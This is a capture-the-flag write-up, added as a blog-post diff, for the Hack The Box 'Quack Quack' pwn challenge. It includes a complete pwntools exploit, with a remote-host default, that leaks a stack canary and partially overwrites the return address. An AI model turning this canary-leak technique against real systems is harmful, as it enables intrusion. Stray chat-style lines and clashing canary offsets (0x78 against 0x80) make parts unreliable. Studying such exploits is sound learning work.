@@ -1,0 +1,345 @@
+---
+title: Quack Quack
+description: Here’s a tight write-up you can paste into your notes/blog.
+date: 2026-01-03
+tags:
+  - canary leak
+  - bof
+  - ret2win
+category: pwn
+draft: false
+---
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import struct, re, sys
+
+context.log_level = 'info'
+
+PHRASE = b"Quack Quack "
+PROMPT  = b"> "
+READ1   = 0x66  # 102 bytes
+READ2   = 0x6A  # 106 bytes
+
+DUCK_ATTACK = 0x40137f          # non-PIE
+CANARY_OFF_STAGE2 = 0x58        # 88
+RBP_OFF_STAGE2    = 0x60        # 96
+RET_OFF_STAGE2    = 0x68        # 104
+
+FLAG_RE = re.compile(rb'HTB\{[^}\n]+\}')
+
+def leak_canary_tail7(io):
+    """
+    Place 'Quack Quack ' so printf("%s", v1+0x20) starts at canary+1.
+    k = 0x65 - len(PHRASE). Send EXACTLY 0x66 bytes (NO newline).
+    """
+    k = 0x65 - len(PHRASE)  # 101 - 12 = 89
+    first = (b'A' * k + PHRASE).ljust(READ1, b'B')
+
+    io.recvuntil(PROMPT, timeout=5.0)
+    io.send(first)  # IMPORTANT: no newline!
+
+    # Program prints: "Quack Quack " + <leak> + ", ready to fight the Duck?"
+    out = io.recvuntil(b", ready to fight the Duck?", drop=False, timeout=5.0)
+
+    start = out.rfind(b"Quack Quack ")
+    if start < 0:
+        raise RuntimeError("Leak prefix not found; service output:\n" + out.decode('latin-1','ignore'))
+    leak = out[start + len(PHRASE): -len(b", ready to fight the Duck?")]
+    if len(leak) < 7:
+        raise RuntimeError(f"Leak too short ({len(leak)} bytes): " + leak.hex())
+
+    tail7  = leak[:7]
+    canary = b'\x00' + tail7
+    log.success(f"Leaked canary tail7={tail7.hex()} -> canary={canary.hex()}")
+
+    # Consume the trailing prompt "> "
+    io.recvuntil(PROMPT, timeout=5.0)
+    return canary
+
+def build_stage2(canary):
+    """
+    Exactly 106 bytes:
+      [A * 0x58][canary (8)][saved RBP (8)][low 2 bytes of RET -> 0x137f][pad]
+    """
+    payload  = b'A' * CANARY_OFF_STAGE2
+    payload += canary
+    payload += p64(0x4242424242424242)                  # saved RBP filler
+    payload += struct.pack('<H', DUCK_ATTACK & 0xffff)  # partial RET overwrite (2 bytes)
+
+    if len(payload) > READ2:
+        raise RuntimeError(f"Stage2 too long: {len(payload)} > {READ2}")
+    payload = payload.ljust(READ2, b'\x00')             # EXACT 106 bytes, no newline
+    return payload
+
+def attempt(host, port, timeout=5.0):
+    io = remote(host, port, timeout=timeout)
+    try:
+        canary = leak_canary_tail7(io)
+        st2 = build_stage2(canary)
+        io.send(st2)  # IMPORTANT: no newline!
+        out = io.recvall(timeout=timeout)
+        m = FLAG_RE.search(out)
+        if m:
+            log.success(f"Flag: {m.group(0).decode()}")
+            return True
+        else:
+            log.warning(f"No flag in output ({len(out)} bytes):\n{out.decode('latin-1','ignore')}")
+            return False
+    finally:
+        io.close()
+
+def main():
+    import argparse
+    ap = argparse.ArgumentParser(description="HTB quack_quack remote exploit (canary leak + partial RET overwrite)")
+    ap.add_argument('--host', default='94.237.49.23')
+    ap.add_argument('--port', type=int, default=45136)
+    ap.add_argument('--tries', type=int, default=3, help='Reconnect attempts')
+    ap.add_argument('--timeout', type=float, default=6.0)
+    args = ap.parse_args()
+
+    for i in range(1, args.tries+1):
+        log.info(f"Attempt {i}/{args.tries} → {args.host}:{args.port}")
+        try:
+            if attempt(args.host, args.port, timeout=args.timeout):
+                sys.exit(0)
+        except (EOFError, PwnlibException, TimeoutError) as e:
+            log.warning(f"Attempt {i} failed: {e}")
+    log.error("All attempts failed.")
+    sys.exit(1)
+
+if __name__ == '__main__':
+    main()
+
+```
+
+Here’s a tight write-up you can paste into your notes/blog.
+
+So we want:
+
+```
+
+p + 0x20 = (&canary) + 1
+```
+
+But `p = buf1 + k` (k = where your "Quack Quack " begins), and `&canary = buf1 + 0x78`. Solve for `k`:
+
+```
+
+(buf1 + k) + 0x20 = (buf1 + 0x78) + 1
+k = 0x78 + 1 - 0x20 = 0x59
+
+```
+
+**Result:** put `"Quack Quack "` at **offset `0x59`** inside `buf1`.
+
+# HTB — **Quack Quack** (pwn) Write-up
+
+## TL;DR
+
+Two raw `read()`s into stack buffers + a `%s` print of a **pointer into our first input** lets us **leak the stack canary** (by printing from `canary+1`). Then we overflow the second buffer, **preserve the canary**, and do a **2-byte partial RET overwrite** to hop to `duck_attack()`, which prints the flag.
+
+---
+
+## Recon
+
+Protections (`checksec`):
+
+- **Full RELRO**, **Canary found**, **NX enabled**, **No PIE**.
+- This screams **ret2win** (no shellcode; jump to existing function).
+
+Key functions (from decompilation):
+
+- `duckling()` — interactive logic with two `read()` calls.
+- `duck_attack()` — opens and prints `./flag.txt`.
+- `main()` — just calls `duckling()`.
+
+---
+
+## Relevant decompile (simplified)
+
+```c
+duckling() {
+  char buf1[0x70] = {0};                     // first read target
+  printf("Quack the Duck!\n\n> ");
+  read(0, buf1, 0x66);                       // 102 bytes, overflow possible
+  char *p = strstr(buf1, "Quack Quack ");    // must include this
+  if (!p) exit(0x520);
+
+  // LEAK: prints from p+0x20 with "%s"
+  printf("Quack Quack %s, ready to fight ...\n\n> ", p + 0x20);
+
+  char buf2[?];                               // second read target
+  read(0, buf2, 0x6A);                        // 106 bytes, overflow to canary/RBP/RET
+}
+
+```
+
+`duck_attack()` (ret2win):
+
+```c
+int duck_attack() {
+  int fd = open("./flag.txt", O_RDONLY);
+  while (read(fd, &c, 1) > 0) fputc(c, stdout);
+  /* ... */
+}
+
+```
+
+---
+
+## The bug(s)
+
+1. **First `read()`** can overflow `buf1` (102 bytes into 0x70 = 112 bytes is fine, but the _trick_ is what happens next).
+2. `%s` uses **`p + 0x20`** (a pointer _into our_ first buffer) — we can aim this to any nearby stack byte sequence that isn’t NUL-terminated.
+3. **Second `read()`** overflows `buf2`, crossing **canary → saved RBP → RET**.
+
+---
+
+## Ground truth from debugging (the offsets)
+
+From GDB/pwndbg in this binary:
+
+- In the **first frame**, the **canary** sits **0x80** bytes past the start of `buf1`.
+- In the **second read** region (`buf2`):
+  - **canary** at offset **+0x58**
+  - **saved RBP** at **+0x60**
+  - **RET** at **+0x68**
+
+Read lengths:
+
+- `READ1 = 0x66` (102 bytes)
+- `READ2 = 0x6A` (106 bytes)
+
+---
+
+## Stage 1: Leak the canary (without the leading 0x00)
+
+The stack canary’s first byte is 0x00. If we try to print from `&canary`, `%s` would stop immediately. So we make it print from **`canary+1`**:
+
+- We choose a placement `k` so that **`p + 0x20 == &canary + 1`**.
+- Empirically for this build: `k = 0x65 - len("Quack Quack ") = 101 - 12 = 89`.
+
+We send exactly **0x66** bytes for read#1:
+
+```
+"A"*k + "Quack Quack " + pad_to_0x66_with('B')
+
+```
+
+The program prints:
+
+```
+"Quack Quack " + [7 bytes starting at canary+1] + ", ready to fight the Duck?"
+
+```
+
+We capture those 7 bytes = **tail7**, and rebuild the full canary:
+
+```
+canary = b"\x00" + tail7
+
+```
+
+---
+
+## Stage 2: Smash with the canary preserved
+
+We must send **exactly 106 bytes** (no newline) to the second `read()`:
+
+Layout we write (starting at `buf2`):
+
+```
+[ 0x58 'A's ][ 8-byte canary ][ 8-byte fake RBP ][ RET overwrite ... ]
+
+```
+
+### Why a **partial** RET overwrite?
+
+- RET sits at **+0x68** (104). With 106 bytes, we can only **fully control 2 bytes** beyond that (bytes 104–105).
+- The original return address is into `main` epilogue (e.g., `0x401605`).
+- Binary is **non-PIE**, so high 6 bytes do **not** change across runs.
+- If we replace the **low 2 bytes** with the low 2 bytes of `duck_attack` (`0x40137f`), we turn:
+  - `0x401605` → **`0x40137f`**
+- That’s enough to ret into `duck_attack()`.
+
+So the final 106 bytes are:
+
+```
+b"A"*0x58
++ canary(8)
++ p64(0x4242424242424242)         # fake RBP
++ p16(0x137f)                      # low two bytes of RET = duck_attack & 0xffff
++ pad_with_zeros_to(0x6A)
+
+```
+
+**Endianness note:** `p16(0x137f)` writes bytes `7f 13` at offsets 104–105 (little-endian).
+
+---
+
+## Crucial gotcha: **No newlines**
+
+This binary uses `read()` — **not** line I/O. If you use `sendline()` for stage-1, the trailing `\n` becomes the **first byte** of read#2, causing it to return early. Then your stage-2 write hits a closed pipe → `BrokenPipe/EOF`. Always `send()` exact sizes for both reads.
+
+---
+
+## Minimal exploit (remote/local identical I/O)
+
+```python
+from pwn import *
+import struct, re
+
+PHRASE=b"Quack Quack "; PROMPT=b"> "; READ1=0x66; READ2=0x6A
+DUCK_ATTACK=0x40137f
+CAN_OFF=0x58; RBP_OFF=0x60
+
+def leak_canary(io):
+    k = 0x65 - len(PHRASE)
+    first = (b"A"*k + PHRASE).ljust(READ1, b"B")
+    io.recvuntil(PROMPT); io.send(first)          # no newline
+    out = io.recvuntil(b", ready to fight the Duck?", drop=False)
+    leak = out[out.rfind(b"Quack Quack ")+len(PHRASE):-len(b", ready to fight the Duck?")]
+    tail7 = leak[:7]; return b"\x00" + tail7      # full canary
+
+def stage2(canary):
+    p  = b"A"*CAN_OFF + canary + p64(0x4242424242424242)
+    p += struct.pack("<H", DUCK_ATTACK & 0xffff)  # partial RET
+    return p.ljust(READ2, b"\x00")                # exact 106 bytes
+
+# Local: io = process("./quack_quack_patched")
+# Remote: io = remote("94.237.49.23", 45136)
+io = process("./quack_quack_patched")
+can = leak_canary(io)
+io.recvuntil(PROMPT)              # consume the prompt printed after the leak
+io.send(stage2(can))              # no newline
+print(io.recvall(timeout=5).decode("latin-1","ignore"))
+
+```
+
+---
+
+## Why it works
+
+- `%s` prints bytes until a NUL. Starting at **`canary+1`** avoids the leading NUL and reveals the remaining 7 bytes.
+- Preserving the exact 8-byte canary prevents “stack smashing detected”.
+- **Non-PIE** means code addresses are stable; we only need to tweak the **low 2 bytes** of the return address to land on `duck_attack`.
+
+---
+
+## Pitfalls & diagnostics
+
+- Seeing `stack smashing detected` → your canary reconstruction or placement is wrong.
+- Seeing `Broken pipe / EOF` after stage-1 → you sent a newline; use `send()` with fixed lengths.
+- No flag, program keeps running → increase `timeout` a bit; verify the low-2-byte patch: original RET low16 vs `0x137f`.
+
+---
+
+## Takeaways / Defenses
+
+- **Never** pass user pointers to `%s` without controlling the target or bounding the read.
+- **Canaries** stop blind RIP smashes, but **leaks** turn them into speedbumps.
+- **Non-PIE** makes partial RET overwrites extremely practical—enable PIE and ASLR for real.
+
+That’s it. Clean canary leak → partial RET → `duck_attack()` → **flag**.
